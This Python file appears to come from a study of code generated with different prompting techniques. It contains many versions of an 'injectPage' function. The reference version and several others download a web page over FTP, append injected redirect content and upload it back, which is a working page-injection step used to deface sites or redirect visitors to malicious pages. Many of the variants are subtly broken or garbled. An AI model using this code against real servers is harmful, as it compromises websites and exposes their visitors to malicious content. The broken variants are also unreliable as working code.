from ftplib import *
import os

def ground_truth_code_injectPage(ftp, page, redirect):
    f = open(page + '.tmp', 'w')
    ftp.retrlines('RETR ' + page, f.write)
  
    f.write(redirect)
    f.close()
  
    with open(page + '.tmp', 'rb') as f:
        ftp.storlines('STOR ' + page, f)

def persona_injectPage(ftp, page, redirect):
    with open(page + '.tmp', 'w') as tmp_file:
        ftp.retrbinary('RETR ' + page, tmp_file.write)
    with open(page + '.tmp', 'ab') as tmp_file:
        tmp_file.write(redirect.encode())
    with open(page + '.tmp', 'rb') as tmp_file:
        ftp.storbinary('STOR ' + page, tmp_file)

def template_injectPage(ftp, page, redirect):
    try:
        with open(page + '.tmp', 'w') as tmp_file:
            ftp.retrbinary('RETR ' + page, tmp_file.write)
            ftp.storbinary(f'STOR {page}.tmp', open(page + '.tmp', 'rb'))
    except Exception as e:
        print(f'An error occurred: {e}')

import ftplib
def question_refinement_injectPage(host, username, password, target_file, additional_content):
    try:
        with ftplib.FTP(host) as ftp:
            ftp.login(user=username, passwd=password)
            with open(target_file, 'rb+') as file:
                ftp.storbinary(f'STOR {target_file}.tmp', file)
                file.seek(0)
                ftp.storlines('APPE', f'{target_file}.tmp', additional_content)
            ftp.delete(target_file)
            ftp.storbinary(f'STOR {target_file}', open(f'{target_file}.tmp', 'rb'))
    except ftplib.all_errors as e:
        return {'error': str(e)}

def alternative_approaches_injectPage(ftp, page, redirect):
    try:
        with open(page + '.tmp', 'wb') as tmp_file:
            ftp.retrbinary('RETR ' + page, tmp_file.write)
        with open(page + '.tmp', 'rb') as tmp_file:
            ftp.storbinary('STOR ' + page, tmp_file)
        os.remove(page + '.tmp')
    except ftplib.all_errors as e:
        print(f'FTP error: {e}')

def context_manager_injectPage(ftp, page, redirect):
    with open(page.replace('.txt', '.tmp'), 'w') as tmp_file:
        ftp.retrbinary('RETR ' + page, tmp_file.write)
        tmp_file.seek(0)
        ftp.storbinary('STOR ' + page.replace('.txt', '.tmp'), tmp_file)

from ftplib import FTP, error_perm
def iterative_prompting_3_injectPage(ftp, page, redirect):
    if not isinstance(page, str) or not isinstance(redirect, str):
        raise ValueError("Page and redirect must be strings")
    temp_filename = page + '.tmp'
    try:
        ftp.retrbinary('RETR ' + page, open(temp_filename, 'wb').write)
    except error_perm as e:
        print(f"FTP error: {e}")
        return
    try:
        with open(temp_filename, 'a') as file:
            file.write(redirect)
    except IOError as e:
        print(f"File I/O error: {e}")
        return
    try:
        ftp.storbinary('STOR ' + temp_filename, open(temp_filename, 'rb'))
    except error_perm as e:
        print(f"FTP error: {e}")
        try:
            os.remove(temp_filename)
        except OSError as delete_error:
            print(f"Error deleting temporary file: {delete_error}")

import os
from os.path import isfile, isdir, getmtime, relpath, join, splitext
_MAX_FILESIZE = 1048576

def is_safe_path(base_path, path, follow_symlinks=True):
    if follow_symlinks:
        resolved_path = os.path.realpath(path)
    else:
        resolved_path = os.path.abspath(path)
    base_path_normalized = os.path.normpath(base_path)
    resolved_path_normalized = os.path.normpath(resolved_path)
    return resolved_path_normalized.startswith(base_path_normalized)
def iterative_prompting_4_inject_page(ftp, page, redirect):
    if not isinstance(page, str) or not page.strip():
        raise ValueError('Page content must be a non-empty string.')
    if not (isfile(redirect) and os.access(redirect, os.R_OK)):
        raise IOError('Redirect must point to an existing file with read permissions.')
    base_path = os.path.dirname(redirect)
    filename = os.path.basename(page) + '.tmp'
    if not is_safe_path(base_path, filename):
        raise ValueError('Filename provided is not safe.')
    try:
        with open(redirect, 'rb') as file:
            for chunk in iter(lambda: file.read(_MAX_FILESIZE), b''):
                if not callable(getattr(ftp, 'storbinary', None)):
                    raise AttributeError('ftp object does not have storbinary method')
                ftp.storbinary(f'STOR {filename}', chunk, b'NOOPWR')
                print(f'Chunk of file {filename} uploaded successfully using storbinary.')
    except Exception as e:
        print(f'An error occurred during file upload: {e}')

import ftplib
def iterative_prompting_5_injectPage(ftp, page, redirect):
    if not isinstance(ftp, ftplib.FTP):
        raise TypeError('ftp must be an instance of FTP')
    if not isinstance(page, str):
        raise TypeError('page must be a string')
    if not isinstance(redirect, str):
        raise TypeError('redirect must be a string')
    if not page:
        raise ValueError('page cannot be empty')
    filename = page + '.tmp'
    try:
        with ftp.open(filename, 'wb') as f:
            ftp.retrbinary('RETR ' + page, lambda data: f.write(data))
        ftp.storbinary('STOR ' + filename, open(filename, 'rb'))
    except ftplib.all_errors as e:
        print(f'FTP error: {e}')
    except IOError as e:
        print(f'IO error: {e}')
    except Exception as e:
        print(f'Unexpected error: {e}')

def few_shots_prompting_injectPage(ftp, page, redirect):
    with open(page + '.tmp', 'wb') as tmp_file:
        ftp.retrbinary('RETR ' + page, tmp_file.write)
        tmp_file.write(redirect.encode())
    with open(page + '.tmp', 'rb') as tmp_file:
        ftp.storbinary('STOR ' + page, tmp_file)

def cot_prompting_injectPage(ftp, page, redirect):
    with open(page + '.tmp', 'w') as file:
        ftp.retrbinary('RETR ' + page, file.write)
    with open(page + '.tmp', 'a') as file:
        file.write(redirect)
    with open(page + '.tmp', 'wb') as file:
        ftp.storbinary('STOR ' + page, file)
    os.remove(page + '.tmp')

from ftplib import FTP
def fact_check_list_injectPage(ftp, page, redirect):
    ftp.login()
    tmp_filename = page + ".tmp"
    ftp.cwd("/")
    with open(tmp_filename, 'wb') as f:
        ftp.retrbinary('RETR ' + page, f.write)
    if ftp.voidresp() != 'CWD':
        with open(tmp_filename, 'r') as f:
            page_contents = f.read()
    modified_contents = page_contents.replace(redirect, '')
    with open(tmp_filename, 'w') as f:
        f.write(modified_contents)
    with open(tmp_filename, 'rb') as f:
        ftp.storbinary('STOR ' + page, f)

import ftplib
def not_interactive_mix_injectPage(ftp, page, redirect):
    if not page or not redirect:
        raise ValueError("Both 'page' and 'redirect' must be provided")
    filename = page + ".tmp"
    try:
        with ftplib.FTP(ftp) as ftp_conn:
            ftp_conn.login()
            file_contents = ftp_conn.retrbinary(f'RETR {page}', callback=None)
            file_contents += redirect
            with open(filename, 'wb') as local_file:
                local_file.write(file_contents)
    except ftplib.all_errors as e:
        print(f"FTP error occurred: {e}")

def baseline_injectPage(ftp, page, redirect):
    filename = page + '.tmp'
    with open(filename, 'w') as file:
        file.write(redirect)
    ftp.storbinary(f'STOR {filename}', open(filename, 'rb'))
    os.remove(filename)

